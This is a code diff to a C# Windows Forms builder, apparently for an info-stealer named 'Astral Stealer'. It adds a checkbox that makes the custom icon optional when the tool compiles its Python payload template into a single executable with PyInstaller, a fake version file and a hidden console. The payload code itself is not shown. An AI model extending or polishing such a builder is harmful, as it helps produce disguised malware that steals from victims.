@@ -10,6 +10,7 @@ namespace Astral_Stealer
 {
     public partial class Form1 : Form
     {
+        private bool enableIcon = false;
         private string exeFileName = "output";
         private string pythonCodeTemplate = @"import asyncio
 import sys
@@ -3205,6 +3206,7 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                 if (compil.Checked)
                 {
                     string hideOption = "";
+                    string iconOption = "";
                     string icon = LinkToIcon.Text; // Utiliser le lien vers l'icône entré dans le champ de texte
 
                     // Définir les options en fonction de l'état des cases à cocher
@@ -3213,8 +3215,14 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                         hideOption = "--noconsole";
                     }
 
+                    // Définir l'option icône si l'icône est activée
+                    if (enableIcon && !string.IsNullOrEmpty(icon))
+                    {
+                        iconOption = $"-i \"{icon}\"";
+                    }
+
                     // Exécuter la commande de compilation
-                    string command = $"pyinstaller --onefile --name {baseFileName} --version-file=./Astral_assets/version/version.txt {hideOption} -i \"{icon}\" {baseFileName}.py";
+                    string command = $"pyinstaller --onefile --name {baseFileName} --version-file=./Astral_assets/version/version.txt {hideOption} {iconOption} {baseFileName}.py";
 
                     // Exécuter la commande avec ProcessStartInfo
                     ProcessStartInfo psiCompile = new ProcessStartInfo
@@ -3240,6 +3248,7 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                 MessageBox.Show($"Error generating Python script: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
+
 
         // Méthode pour remplacer une valeur dans le template de code Python
         private string ReplaceOptionValue(string template, string option, string value)
@@ -3668,6 +3677,11 @@ VSVersionInfo(
         private void ExeNameOutput_TextChanged(object sender, EventArgs e)
         {
             exeFileName = ExeNameOutput.Text;
+        }
+
+        private void Enable_icon_CheckedChanged(object sender, EventArgs e)
+        {
+            enableIcon = Enable_icon.Checked;
         }
     }
 }
